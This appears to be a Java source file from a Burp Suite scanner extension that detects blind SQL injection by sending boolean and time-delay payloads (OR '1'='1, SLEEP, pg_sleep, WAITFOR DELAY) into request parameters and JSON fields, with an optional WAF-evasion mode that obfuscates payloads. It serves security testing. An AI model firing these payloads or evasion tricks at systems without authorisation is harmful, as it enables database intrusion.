package com.ioactive.aiscanner.scan;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.RequestOptions;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.params.ParsedHttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.ioactive.aiscanner.ui.ScanLog;

import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Set;
import java.util.function.Function;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Deterministic <em>blind</em> SQL-injection oracle — generic (the existing error-based check misses
 * blind). Two inference channels, both differential and target-agnostic:
 * <ul>
 *   <li><b>Boolean</b>: append an always-true vs always-false condition to a value; a vulnerable query
 *       makes the TRUE response track the baseline while the FALSE response diverges (fewer/no rows).
 *       Confirmed only when two DIFFERENT true literals agree AND differ from false — so an endpoint that
 *       merely echoes the payload (different digits → different response) can't false-positive.</li>
 *   <li><b>Time</b>: append a DB sleep (MySQL/Postgres/MSSQL variants); confirmed when the response is
 *       delayed past a threshold beyond the measured baseline.</li>
 * </ul>
 * Injects into URL/BODY params AND JSON body string fields (Montoya's param model doesn't expose JSON
 * fields, so a JSON API's insertion points are otherwise skipped — the same gap that hid NoSQL). No
 * app-specific payloads or paths — the SQL is generic and the decision is a response differential.
 */
public final class BlindSqliProbe {

    private final MontoyaApi api;
    private final ScanLog scanLog;

    // {trueA, false, trueB} triples across quoting contexts. trueA and trueB are BOTH logically true
    // but use DIFFERENT literals — a real boolean SQLi makes them agree (and differ from false), while
    // mere reflection of the payload makes them differ (different digits), which kills the classic
    // false positive on endpoints that just echo the input (e.g. command-injection reflectors).
    private static final String[][] BOOL = {
            {"' OR '1'='1", "' OR '1'='2", "' OR '8'='8"},
            {"' AND '1'='1", "' AND '1'='2", "' AND '8'='8"},
            {"\" OR \"1\"=\"1", "\" OR \"1\"=\"2", "\" OR \"8\"=\"8"},
            {" OR 1=1", " OR 1=2", " OR 8=8"},
            {" AND 1=1", " AND 1=2", " AND 8=8"},
            {"') OR ('1'='1", "') OR ('1'='2", "') OR ('8'='8"},
    };
    // Time-delay payloads (~5s) across engines; appended to the value.
    private static final String[] TIME = {
            "' AND SLEEP(5)-- -",
            " AND SLEEP(5)-- -",
            "' AND SLEEP(5) AND '1'='1",
            "';SELECT pg_sleep(5)-- -",
            "' AND pg_sleep(5)-- -",
            "';WAITFOR DELAY '0:0:5'-- -",
    };
    private static final long TIME_THRESHOLD_MS = 4000;
    private static final Pattern SKIP = Pattern.compile(
            "(?i).*/(socket\\.io|engine\\.io)(\\b.*)?$|.*\\.(css|js|png|jpe?g|gif|svg|ico|woff2?|ttf|eot|map|mp4|webp|pdf)(\\?.*)?$");
    // A JSON "key":"value" string field (value may contain escaped chars).
    private static final Pattern JSON_STR = Pattern.compile("\"([^\"]+)\"\\s*:\\s*\"((?:[^\"\\\\]|\\\\.)*)\"");

    public BlindSqliProbe(MontoyaApi api, ScanLog scanLog) {
        this.api = api;
        this.scanLog = scanLog;
    }

    public boolean probe(HttpRequest req) {
        try {
            if (SKIP.matcher(req.url()).matches()) return false;
            long t0 = System.nanoTime();
            HttpRequestResponse base = send(req);
            long baseMs = (System.nanoTime() - t0) / 1_000_000;
            if (base == null || base.response() == null) return false;

            // 1) URL/BODY params — inject via Montoya's parameter model.
            for (ParsedHttpParameter p : req.parameters()) {
                if (p.type() != HttpParameterType.URL && p.type() != HttpParameterType.BODY) continue;
                String orig = p.value() == null ? "" : p.value();
                if (runChannels(req, v -> inject(req, p, v),
                        p.name() + " (" + p.type() + ")", orig, seeds(orig), baseMs)) return true;
            }

            // 2) JSON body string fields — Montoya doesn't expose these as parameters, so inject into the
            //    raw body. This is what reaches JSON APIs (e.g. a coupon_code posted as {"coupon_code":…}).
            if (isJson(req)) {
                String body = req.bodyToString();
                Matcher m = JSON_STR.matcher(body);
                Set<String> keys = new LinkedHashSet<>();
                while (m.find()) keys.add(m.group(1));       // collect first so injection can't disturb iteration
                for (String key : keys) {
                    String cur = currentJsonValue(body, key);
                    if (runChannels(req, v -> req.withBody(setJsonString(body, key, v)),
                            key + " (JSON)", cur, seeds(cur), baseMs)) return true;
                }
            }
        } catch (Throwable t) {
            scanLog.debug("[AI Scanner] blind-sqli probe error: " + t);
        }
        return false;
    }

    /** Seeds to try: the discovered value AND a generic likely-valid id "1". The AND channel needs a value
     *  that returns a row (a crawler placeholder like "test" often isn't); OR needs one that doesn't —
     *  trying both covers either query context. */
    private static Set<String> seeds(String orig) {
        Set<String> s = new LinkedHashSet<>();
        if (orig != null && !orig.isEmpty()) s.add(orig);
        s.add("1");
        return s;
    }

    /** Boolean triples to try: the plain set, plus WAF-evasion variants (inline SQL comments + alternating
     *  case) when evasion mode is on. The transforms are semantics-preserving (the parser ignores inline
     *  comments and is case-insensitive), so the true/false logic still holds — but the obfuscated form slips
     *  past signature WAFs that block the naive payload. A 4th element tags evasion variants for the label.
     *  A blocked payload can't false-positive: all three legs get the same 403, so the triple never separates. */
    private static List<String[]> boolTriples() {
        List<String[]> out = new ArrayList<>();
        for (String[] t : BOOL) out.add(new String[]{ t[0], t[1], t[2], "" });
        if (Evasion.enabled()) {
            for (String[] t : BOOL) {
                out.add(new String[]{ inlineComment(t[0]), inlineComment(t[1]), inlineComment(t[2]), " [WAF-evasion inline-comment]" });
                out.add(new String[]{ Evasion.caseFlip(t[0]), Evasion.caseFlip(t[1]), Evasion.caseFlip(t[2]), " [WAF-evasion case]" });
            }
        }
        return out;
    }
    private static String inlineComment(String s) {
        return s.replaceAll("\\s+", Matcher.quoteReplacement("/" + "**" + "/"));
    }

    /** Boolean + time channels for one injection point, abstracted over how a value is placed into the
     *  request ({@code build}) so params and JSON fields share the exact same oracle. */
    private boolean runChannels(HttpRequest req, Function<String, HttpRequest> build,
                                String label, String orig, Set<String> seeds, long baseMs) {
        // --- boolean-based: two DIFFERENT true literals must agree with each other and differ from false,
        //     via the status channel (exists 200 / missing 404) or the normalized-body channel. Reflection
        //     makes the two trues differ → no FP. And a candidate MUST REPRODUCE on a second independent
        //     triple — intermittent non-determinism (flaky 4xx/5xx, reordered errors) won't repeat, a real
        //     boolean condition will.
        for (String seed : seeds) {
            for (String[] tf : boolTriples()) {
                int v = evalTriple(build, seed, tf);
                if (v != 0 && evalTriple(build, seed, tf) == v) {   // reproduce-gate
                    HttpRequestResponse ta = send(build.apply(seed + tf[0]));   // fresh evidence
                    scanLog.found("SQL injection (blind)", req.url(),
                            "boolean-based " + label + " via " + (seed + tf[0]).trim()
                                    + (tf.length > 3 ? tf[3] : ""), ta);
                    scanLog.incFinding();
                    return true;
                }
            }
        }
        // --- time-based ---
        for (String payload : TIME) {
            long s0 = System.nanoTime();
            send(build.apply(orig + payload));
            long dt = (System.nanoTime() - s0) / 1_000_000;
            if (dt > baseMs + TIME_THRESHOLD_MS) {
                long c0 = System.nanoTime();                   // confirm it's the payload, not a fluke
                HttpRequestResponse tr = send(build.apply(orig + payload));   // capture the delayed response as evidence
                long dt2 = (System.nanoTime() - c0) / 1_000_000;
                if (dt2 > baseMs + TIME_THRESHOLD_MS) {
                    scanLog.found("SQL injection (blind)", req.url(), "time-based " + label + " +" + dt
                            + "ms (the injected sleep delayed the response — attached)", tr);
                    scanLog.incFinding();
                    return true;
                }
            }
        }
        return false;
    }

    /** Send true/false/true for one triple; return which channel separates them: 2=content, 1=status,
     *  0=none. rsig already includes the status, so the content channel subsumes status changes; the
     *  status-only channel is the fallback when bodies are identical but the status flips. */
    private int evalTriple(Function<String, HttpRequest> build, String seed, String[] tf) {
        HttpRequestResponse ta = send(build.apply(seed + tf[0]));   // true (literal A)
        HttpRequestResponse fa = send(build.apply(seed + tf[1]));   // false
        HttpRequestResponse tb = send(build.apply(seed + tf[2]));   // true (literal B)
        if (ta == null || fa == null || tb == null
                || ta.response() == null || fa.response() == null || tb.response() == null) return 0;
        String sa = rsig(ta, seed + tf[0]), sf = rsig(fa, seed + tf[1]), sb = rsig(tb, seed + tf[2]);
        if (sa.equals(sb) && !sa.equals(sf)) return 2;                       // content channel
        int sta = ta.response().statusCode(), stf = fa.response().statusCode(), stb = tb.response().statusCode();
        if (sta == stb && sta != stf) return 1;                             // status-only channel
        return 0;
    }

    private static HttpRequest inject(HttpRequest req, ParsedHttpParameter p, String value) {
        return req.withUpdatedParameters(HttpParameter.parameter(p.name(), value, p.type()));
    }

    /** Replace the FIRST {@code "key":"…"} string value in a JSON body with {@code val} (JSON-escaped). */
    private static String setJsonString(String body, String key, String val) {
        String replacement = "$1" + Matcher.quoteReplacement(jsonEscape(val)) + "$2";
        return body.replaceFirst(
                "(\"" + Pattern.quote(key) + "\"\\s*:\\s*\")(?:[^\"\\\\]|\\\\.)*(\")", replacement);
    }

    private static String currentJsonValue(String body, String key) {
        Matcher m = Pattern.compile(
                "\"" + Pattern.quote(key) + "\"\\s*:\\s*\"((?:[^\"\\\\]|\\\\.)*)\"").matcher(body);
        return m.find() ? jsonUnescape(m.group(1)) : "";
    }

    private static String jsonEscape(String s) {
        return s == null ? "" : s.replace("\\", "\\\\").replace("\"", "\\\"");
    }

    private static String jsonUnescape(String s) {
        return s == null ? "" : s.replace("\\\"", "\"").replace("\\\\", "\\");
    }

    /** Response signature = HTTP status + normalized body — captures a status flip and a content change. */
    private static String rsig(HttpRequestResponse rr, String injected) {
        if (rr == null || rr.response() == null) return "";
        return rr.response().statusCode() + ":" + sig(rr.response().bodyToString(), injected);
    }

    /** Normalize a body for boolean comparison: drop the (possibly reflected) injected value, strip
     *  32-hex CSRF tokens, collapse whitespace, AND sort the tokens. The token-sort is essential:
     *  many frameworks emit validation errors / JSON keys in a NON-DETERMINISTIC order (HashMap
     *  iteration), so two IDENTICAL requests come back word-reordered — which would fool the content
     *  channel into "true==true, differs from false" purely by chance (observed on crAPI's Spring
     *  identity endpoints). Sorting neutralizes reorder noise while a real result-set change (different
     *  tokens, more/fewer rows) still moves the signature. */
    private static String sig(String body, String injected) {
        if (body == null) return "";
        String s = body;
        if (injected != null && !injected.isEmpty()) {
            s = s.replace(injected, "");
            s = s.replace(htmlEsc(injected), "");   // reflected-but-HTML-encoded form
        }
        String norm = s.replaceAll("(?i)[a-f0-9]{32}", "").replaceAll("\\s+", " ").trim();
        String[] toks = norm.split(" ");
        java.util.Arrays.sort(toks);
        return String.join(" ", toks);
    }

    private static String htmlEsc(String s) {
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                .replace("\"", "&quot;").replace("'", "&#039;");
    }

    private static boolean isJson(HttpRequest req) {
        try {
            String b = req.bodyToString();
            if (b == null || b.isBlank()) return false;
            String ct = req.hasHeader("Content-Type") ? req.headerValue("Content-Type") : "";
            if (ct != null && ct.toLowerCase().contains("json")) return true;
            String t = b.trim();   // fall back to body SHAPE — captured/replayed reqs can lose the header
            return (t.startsWith("{") && t.endsWith("}")) || (t.startsWith("[") && t.endsWith("]"));
        } catch (Throwable t) { return false; }
    }

    private HttpRequestResponse send(HttpRequest req) {
        try { return api.http().sendRequest(req, RequestOptions.requestOptions()); }
        catch (Throwable t) { return null; }
    }
}
